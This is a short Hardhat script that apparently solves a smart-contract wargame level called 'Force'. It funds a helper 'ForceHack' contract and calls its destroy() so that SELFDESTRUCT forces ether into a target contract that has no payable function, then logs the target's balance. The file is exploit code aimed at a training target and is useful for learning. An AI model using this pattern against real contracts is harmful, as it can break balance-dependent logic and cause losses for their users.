import { ethers } from "hardhat";

async function main(){
    // random player address
    let player = "0xbDA5747bFD65F08deb54cb465eB87D40e51B197E";
    // force contract address
    let address_a = "0x3Aa5ebB10DC797CAC828524e59A333d0A371443c";
    // forcehack contract address
    let address_b = "0xc6e7DF5E7b4f2A278906862b61205850344D4e7d";

    let signer = await ethers.getSigner(player);
    // not needed in this stage
    let contract_a = await ethers.getContractAt("Force", address_a, signer);
    let contract_b = await ethers.getContractAt("ForceHack", address_b, signer);

    let options = {
        to: address_b,
        value: 10
    };

    // we first send some ether to our hacking contract
    await signer.sendTransaction(options);
    // use SELFDESTRUCT opcode to force send ether to contract with no payable function
    await contract_b.destroy();

    // check that target contract has received ether
    console.log(await contract_b.provider.getBalance(address_a));

}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
